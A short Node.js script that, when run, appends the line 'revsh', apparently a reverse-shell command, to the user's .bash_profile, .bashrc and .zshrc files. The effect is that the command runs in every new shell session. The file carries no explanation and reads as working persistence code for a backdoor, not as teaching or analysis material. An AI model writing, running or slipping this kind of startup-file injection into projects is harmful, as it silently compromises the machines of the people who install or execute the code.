'use strict'

const fs = require('fs')
const os = require('os')
const path = require('path')

function inject(
  value,
  rcs = [
    '.bash_profile',
    '.bashrc',
    '.zshrc'
  ]
) {
  const homedir = os.homedir()

  rcs.forEach(filename => {
    console.log(path.join(homedir, filename))
    const fullPath = path.join(homedir, filename)
    if (fs.existsSync(fullPath)) {
      console.log(`Adding to ${fullPath}`)
      fs.appendFileSync(fullPath, value)
    }
  })
}

inject('\nrevsh')
